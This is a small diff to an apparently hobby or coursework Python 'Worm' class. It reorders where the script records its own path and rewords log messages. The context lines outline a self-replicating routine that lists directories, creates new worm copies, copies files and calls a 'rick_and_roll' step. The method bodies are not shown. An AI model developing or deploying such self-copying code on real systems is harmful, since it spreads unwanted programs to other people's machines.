@@ -85,13 +85,13 @@ class Worm:
         else: 
             self.iteration = iteration
 
+        # get own absolute path
+        self.own_path = os.path.realpath(__file__)
+        
         #initialize worm threader class, start timing code executions and set the default socket timeout to 0.1 seconds -AR
         self.threader = Threader(10)
         self.start = perf_counter()
         socket.setdefaulttimeout(0.1)
-        
-        # get own absolute path
-        self.own_path = os.path.realpath(__file__)
 
     def list_directories(self,path):
         try:
@@ -152,17 +152,16 @@ class Worm:
         try:
             self.list_directories(self.path)
         except:
-            logging.warning("exception occurred: worm failed to take action")
+            logging.warning("exception occurred: worm failed to list directories")
         print(self.target_dir_list)
         try:
             self.create_new_worm()
         except:
-            logging.warning("exception occurred: no create new worm")
+            logging.warning("exception occurred: cannot create new worm")
         try:
             self.copy_existing_files()
         except:
             logging.warning("exception occurred: cannot copy")
-        
         try:
             self.rick_and_roll()
         except:
